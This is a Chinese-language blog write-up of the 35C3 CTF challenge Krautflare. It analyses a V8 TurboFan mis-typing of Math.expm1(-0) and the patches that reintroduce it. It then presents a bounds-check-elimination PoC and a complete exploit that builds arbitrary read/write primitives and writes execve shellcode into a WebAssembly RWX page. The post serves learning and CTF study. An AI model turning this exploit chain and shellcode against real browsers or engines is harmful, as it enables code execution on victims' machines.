---

layout: post

title: '35c3ctf-Krautflare分析'

date: '2020-08-06'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

## 前言

### 环境搭建

**（1）安装Turbolizer可视化工具**

安装npm：

Ubuntu下默认的apt里面的nodejs不好使，安装最新版的

python-software-properties 有些情况下他可能会找不到，然后会提示你安装另一个包，如果是这样的话根据提示安装那个包就好了。

```
sudo apt-get install curl python-software-properties
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt-get install nodejs

sudo apt-get install npm
```

启动：

```
cd v8/v8/tools/turbolizer
npm i
npm run-script build
python -m SimpleHTTPServer 8000
之后通过chrome浏览器访问 127.0.0.1:8000
```

npm i 这一步报错，可能是切的支线有问题，换个支线，我是先换到了漏洞版本，后面还是报错，显示一些包404 not found，编辑package-lock.json，删除那些找不到的依赖包，运行npm i就会下载存在的依赖包，之后运行npm run-script build 就可以完成了。过程并没有网上搭建教程那么顺利。

**（2）搭建题目环境**

```c
git reset --hard dde25872f58951bb0148cf43d6a504ab2f280485
git apply < ../d8-strip-globals.patch
git apply < ../revert-bugfix-880207.patch
git apply < ../open_files_readonly.patch
gclient sync
./tools/dev/gm.py x64.release
./tools/dev/gm.py x64.debug
```

（3）生成Turbolizer文件

```
./d8 --allow-natives-syntax --trace-turbo poc.js
```

之后在浏览器打开生成的turbo-foo-1.json， turbo-foo-0.json好像没啥用。

### 基础知识

（1）**Math.expm1方法**：

![image-20200806193851239](..\image\2020-08-06-35c3ctf-Krautflare分析\1.png)

例子：

```c
Math.expm1(1) // 1.7182818284590453
Math.expm1(-38) // -1
Math.expm1("-38") // -1
Math.expm1("foo") // NaN
Math.expm1(-0) // -0
```

（2）**ConstantFolding 优化**：

ConstantFolding 是进行常量折叠，作用就是类似于在PlainNumber 为ObjectIsMinusZero 的参数时，判定肯定不是负数时会直接优化，将该节点折叠成false ，从而提高效率。

## 漏洞分析

该题由Issue 1710 改编而来，Issue 1710的漏洞在于Math.expm1函数的返回值类型为PlainNumber 或 NaN，而Math.expm1(-0) 返回-0，既不是PlainNumber 也不是 NaN类型，所以比较会返回false。

```javascript
function foo() {
	return Object.is(Math.expm1(-0), -0);
}
console.log(foo());
%OptimizeFunctionOnNextCall(foo);
console.log(foo());
```
Turbolizer 分析流程图：

![image-20200807162623199](..\image\2020-08-06-35c3ctf-Krautflare分析\2.png)


上述代码在Issue 1710版本运行的结果为：

```
true
flase
```

修复方案为：

```c
diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
index b88b5c6..85c0998 100644
--- a/src/compiler/operation-typer.cc
+++ b/src/compiler/operation-typer.cc
@@ -417,7 +417,7 @@
Type OperationTyper::NumberExpm1(Type type) {
DCHECK(type.Is(Type::Number()));
- return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
+ return Type::Number();
}
```

将NumberExpm1 的类型改成了Number，-0为Number类型，所以能够正常比较。而题目中打了上述补丁，但又引入了类似的漏洞：

该题一共引入三个补丁：

d8-strip-globals.patch：

```c
commit 3794e5f0eeee3d421cc0d2a8d8b84ac82d37f10d
Author: Your Name <you@example.com>
Date:   Sat Dec 15 18:21:08 2018 +0100

    strip global in realms

diff --git a/src/d8.cc b/src/d8.cc
index 98bc56ad25..e72f528ae5 100644
--- a/src/d8.cc
+++ b/src/d8.cc
@@ -1043,9 +1043,8 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
```

open_files_readonly.patch：

```c
commit 430071ed28001ad0112d90b287734e8db8a0bbd8
Author: Stephen Roettger <stephen.roettger@gmail.com>
Date:   Sun Dec 16 19:52:37 2018 +0100

    open files ro to play more nicely with ro environments

diff --git a/src/base/platform/platform-posix.cc b/src/base/platform/platform-posix.cc
index 6223701b35..43ebed7f75 100644
--- a/src/base/platform/platform-posix.cc
+++ b/src/base/platform/platform-posix.cc
@@ -446,12 +446,12 @@ class PosixMemoryMappedFile final : public OS::MemoryMappedFile {
 
 // static
 OS::MemoryMappedFile* OS::MemoryMappedFile::open(const char* name) {
-  if (FILE* file = fopen(name, "r+")) {
+  if (FILE* file = fopen(name, "r")) {
     if (fseek(file, 0, SEEK_END) == 0) {
       long size = ftell(file);  // NOLINT(runtime/int)
       if (size >= 0) {
         void* const memory =
-            mmap(OS::GetRandomMmapAddr(), size, PROT_READ | PROT_WRITE,
+            mmap(OS::GetRandomMmapAddr(), size, PROT_READ,
                  MAP_SHARED, fileno(file), 0);
         if (memory != MAP_FAILED) {
           return new PosixMemoryMappedFile(file, memory, size);
```

**revert-bugfix-880207.patch**， 以下补丁引入了漏洞，将JSCall节点中的kMathExpm1 返回类型从Type::Number() 改成了Type::Union(Type::PlainNumber(), Type::NaN(), t->zone())，所以如果Math.expm1 生成的节点是 JSCall 而不是NumberExpm1，就会造成和Issue 1710 一样的漏洞。

```c
commit 950e28228cefd1266cf710f021a67086e67ac6a6
Author: Your Name <you@example.com>
Date:   Sat Dec 15 14:59:37 2018 +0100

    Revert "[turbofan] Fix Math.expm1 builtin typing."
    
    This reverts commit c59c9c46b589deb2a41ba07cf87275921b8b2885.

diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 60e7ed574a..8324dc06d7 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     // Unary math functions.
     case BuiltinFunctionId::kMathAbs:
     case BuiltinFunctionId::kMathExp:
+    case BuiltinFunctionId::kMathExpm1:
       return Type::Union(Type::PlainNumber(), Type::NaN(), t->zone());
     case BuiltinFunctionId::kMathAcos:
     case BuiltinFunctionId::kMathAcosh:
@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     case BuiltinFunctionId::kMathAtanh:
     case BuiltinFunctionId::kMathCbrt:
     case BuiltinFunctionId::kMathCos:
-    case BuiltinFunctionId::kMathExpm1:
     case BuiltinFunctionId::kMathFround:
     case BuiltinFunctionId::kMathLog:
     case BuiltinFunctionId::kMathLog1p:
diff --git a/test/mjsunit/regress/regress-crbug-880207.js b/test/mjsunit/regress/regress-crbug-880207.js
index 09796a9ff4..0f65ddb56b 100644
--- a/test/mjsunit/regress/regress-crbug-880207.js
+++ b/test/mjsunit/regress/regress-crbug-880207.js
@@ -4,34 +4,10 @@
 
 // Flags: --allow-natives-syntax
 
-(function TestOptimizedFastExpm1MinusZero() {
-  function foo() {
-    return Object.is(Math.expm1(-0), -0);
-  }
+function foo() {
+  return Object.is(Math.expm1(-0), -0);
+}
 
-  assertTrue(foo());
-  %OptimizeFunctionOnNextCall(foo);
-  assertTrue(foo());
-})();
-
-(function TestOptimizedExpm1MinusZeroSlowPath() {
-  function f(x) {
-    return Object.is(Math.expm1(x), -0);
-  }
-
-  function g() {
-    return f(-0);
-  }
-
-  f(0);
-  // Compile function optimistically for numbers (with fast inlined
-  // path for Math.expm1).
-  %OptimizeFunctionOnNextCall(f);
-  // Invalidate the optimistic assumption, deopting and marking non-number
-  // input feedback in the call IC.
-  f("0");
-  // Optimize again, now with non-lowered call to Math.expm1.
-  assertTrue(g());
-  %OptimizeFunctionOnNextCall(g);
-  assertTrue(g());
-})();
+assertTrue(foo());
+%OptimizeFunctionOnNextCall(foo);
+assertTrue(foo());
```



现在关键是如何将Math.expm1 生成的节点是变为JSCall？通过传入字符串参数，如下：

```javascript
function foo(x) {
        return Object.is(Math.expm1(x), -0);
}
console.log(foo(-0));
%OptimizeFunctionOnNextCall(foo);
foo("foo");
%OptimizeFunctionOnNextCall(foo);
console.log(foo(-0));
```

返回结果为：

```
true
flase
```

Turbolizer 分析流程图：

![image-20200807163234450](..\image\2020-08-06-35c3ctf-Krautflare分析\3.png)

从上图中可以看到Math.expm1 生成的节点已经由NumberExpm1 变成了JSCall ，类型为PlainNumber 或 NaN，与-0进行比较，-0既不是PlainNumber 也不是 NaN类型，所以比较返回false。

在tyerd lowering 阶段，v8处理SameValue 节点时发现是和-0 比较，会将节点换成ObjectIsMinusZero ，同时在再次优化ObjectIsMinusZero 节点时发现一边是-0 ，一边不是，就直接返回false。

优化SameValue 判断的调用链如下：

```c
TypedOptimization::ReduceSameValue
    ->else if (rhs_type.Is(Type::MinusZero())) 
        ->simplified()->ObjectIsMinusZero()
        	->if (!type.Maybe(Type::MinusZero()))
                ->return t->singleton_false_;
```

展示**typed lowering** 节点，返回false。

![image-20200807172350412](..\image\2020-08-06-35c3ctf-Krautflare分析\4.png)

## 漏洞利用

利用优化，使得下述代码中的idx被认为是返回false，去除后面a[idx]的边界检查（CheckBound），而实际返回true，从而导致越界读写，但下面的例子并不能成功越界读写，因为在typed lowering 阶段，优化ObjectIsMinusZero 节点后，idx始终返回的是false。

```javascript
function foo(x) {
	var a = [1.1, 2.2, 3.3];
	let idx = Object.is(Math.expm1(x), -0);
	idx *= 1337;
	return a[idx]
}
console.log(foo(0));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("0"));
%OptimizeFunctionOnNextCall(foo);
foo(-0);
console.log(foo(-0));
```

typed lowering 阶段的Turbolizer 分析流程图：

![image-20200807175227064](..\image\2020-08-06-35c3ctf-Krautflare分析\5.png)



现在就是需要找到哪个地方将idx 优化返回false？在TyperLoweringPhase 和LoadEliminationPhase 阶段会进行常量折叠，即前言中提到的**ConstantFolding 优化**。

处理优化的各个阶段如下：

![image-20200807180247564](..\image\2020-08-06-35c3ctf-Krautflare分析\6.png)



从上图中可以看到TyperPhase 、LoadEliminationPhase 和 SimplifiedLoweringPhase 这三个阶段会进行Typing优化，用于确认各阶段的类型，而**TypedLoweringPhase**和**LoadEliminationPhase**这两个阶段会进行**ConstantFolding 优化**，在Typing之后进行**ConstantFolding 优化**会导致通过判断左右两边不相等，直接将节点折叠成false。

所以我们需要在LoadEliminationPhase后进行Typing，在EscapeAnalysis 阶段前将数据 -0 隐藏起来，在经过EscapeAnalysisPhase之后才变成-0，这样前面的Typing 阶段以及ConstantFolding 优化时都会认为-0 是变量，不会将idx优化成false，

在最后的SimplifiedLoweringPhase 阶段（SimplifiedLoweringPhase 会进行checkbound 边界判断。该阶段会判断索引的范围，如果确定没有越界访问，就会将checkbound的检查去除。）时认为是变量，范围是Range(0,1337)，认为不是越界访问，从而绕过checkbound，造成越界读写。

Poc代码如下：

```javascript
function foo(x) {
	let tmp = {escapeVar: -0};
	var a = [1.1, 2.2, 3.3];
	let idx = Object.is(Math.expm1(x), tmp.escapeVar);
	idx *= 1337;
	return a[idx];
}
console.log(foo(0));
%OptimizeFunctionOnNextCall(foo);
console.log(foo("0"));
%OptimizeFunctionOnNextCall(foo);
foo(-0);
console.log(foo(-0));
```

**LoadEliminationPhase 阶段**的Turbolizer 分析流程图，此时tmp.escapeVar为LoadField[+24]，SameValue并不知道它为-0，所以返回值为Boolean，范围为0或1，后续数组的访问范围为（0，1337），CheckBounds的检查范围也为（0，1337）。

![image-20200810105753255](..\image\2020-08-06-35c3ctf-Krautflare分析\7.png)



**EscapeAnalysis 阶段**：LoadField[+24] 节点变成了NumberConstant[-0]，并且EscapeAnalysis 后不再进行常量折叠，所以不直接返回false。

![image-20200810110516791](..\image\2020-08-06-35c3ctf-Krautflare分析\8.png)



**SimplifiedLoweringPhase阶段**，去掉了CheckBound节点，因为进行typing 后，v8认为SameValue 返回的永远
是false ，后面访问不会越界，于是将CheckBound 去掉。

![image-20200810111554354](..\image\2020-08-06-35c3ctf-Krautflare分析\9.png)

最终真正运行时idx 返回true，并且没有了CheckBound的检查，导致越界读写。

**漏洞利用步骤**：

（1）利用poc代码造成越界读写，在越界读写后面布置float类型的数组，越界修改float数组的length

```javascript
function foo_exp(x) {
	let tmp = {escapeVar: -0};
	let idx = Object.is(Math.expm1(x), tmp.escapeVar);
	idx *= 11;
	var a = [1.1, 2.2, 3.3];
	float_array = [4.4, 5.5, 6.6];
	data_buf = new ArrayBuffer(0x233);
	obj = {mark: i2f(0xdeadbeef), obj: wasm_function};
	a[idx] = i2f(0x0000100000000000);
}

foo_exp(0);
for(let i=0; i<10000; i++){
	foo_exp("0");
}

foo_exp(-0);
gc();
```

（2）此时float数组就可以进行越界读写，根据mark查找wasm_function对象的地址

```javascript
var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(float_array[i]) == 0xdeadbeef){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(float_array[float_obj_idx])));
		break;
	}
}
```

（3）根据data_buf的大小查找data_buf->backing_store，用于构造任意读写原语

```javascript
//------ find backing_store
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(float_array[i]) == 0x233){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(float_array[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read
function dataview_read64(addr)
{
	float_array[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	float_array[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}
```

（4）根据wasm_function–>shared_info–>WasmExportedFunctionData（data）–>instance+0xe8 找到rwx的区域，将shellcode写入该区域即可。



exp代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	let tmp = Array.from(Uint32);
	return tmp[1] * 0x100000000 + tmp[0]; 
}

function i2f(i)
{
	let tmp = [];
	tmp[0] = parseInt(i % 0x100000000);
	tmp[1] = parseInt((i-tmp[0]) / 0x100000000);
	Uint32.set(tmp);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}


function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var float_array;
var obj = [];
var data_buf;

function foo_exp(x) {
	let tmp = {escapeVar: -0};
	let idx = Object.is(Math.expm1(x), tmp.escapeVar);
	idx *= 11;
	var a = [1.1, 2.2, 3.3];
	float_array = [4.4, 5.5, 6.6];
	data_buf = new ArrayBuffer(0x233);
	obj = {mark: i2f(0xdeadbeef), obj: wasm_function};
	a[idx] = i2f(0x0000100000000000);
}

foo_exp(0);
for(let i=0; i<10000; i++){
	foo_exp("0");
}

foo_exp(-0);

gc();

console.log("[+] float_array.length: 0x" + hex(float_array.length));

//---------find wasm_function
var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(float_array[i]) == 0xdeadbeef){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(float_array[float_obj_idx])));
		break;
	}
}

//------ find backing_store
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(float_array[i]) == 0x233){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(float_array[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read
function dataview_read64(addr)
{
	float_array[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	float_array[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

//----- get wasm_code by AAR

var wasm_function_addr = f2i(float_array[float_obj_idx]);
console.log("[+] wasm_function_addr: 0x"+hex(wasm_function_addr));

var wasm_shared_info = dataview_read64(wasm_function_addr -1 + 0x18);
console.log("[+] find wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_data = dataview_read64(wasm_shared_info -1 + 0x8);
console.log("[+] find wasm_data : 0x" + hex(wasm_data));

var wasm_instance = dataview_read64(wasm_data -1 + 0x10);
console.log("[+] find wasm_instance : 0x" + hex(wasm_instance));

var wasm_rwx = dataview_read64(wasm_instance - 1 + 0xe8);
console.log("[+] find wasm_rwx : 0x" + hex(wasm_rwx));


//write shellcode to wasm
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_rwx, shellcode);

wasm_function();
```



运行效果图：

![image-20200810151448098](..\image\2020-08-06-35c3ctf-Krautflare分析\10.png)



## 参考链接

https://bugs.chromium.org/p/project-zero/issues/detail?id=1710

https://bbs.pediy.com/thread-252812.htm

https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/